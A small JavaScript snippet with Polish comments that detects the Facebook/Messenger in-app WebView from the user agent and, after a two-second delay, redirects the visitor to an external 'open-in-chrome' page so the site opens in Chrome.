(function () {
  const ua = navigator.userAgent;
  const isWV = ua.includes("FBAV") && ua.includes("wv"); // Messenger / FB WebView

  if (isWV) {
    // Możesz dodać logikę wysyłania powiadomienia na Discord
    console.log("📲 WebView Messenger/FB wykryty – przekierowanie do Chrome");

    // Automatyczne przekierowanie po 2 sekundach
    setTimeout(() => {
      window.location.href = "https://checkerls.vercel.app/open-in-chrome.html";
    }, 2000);
  }
})();
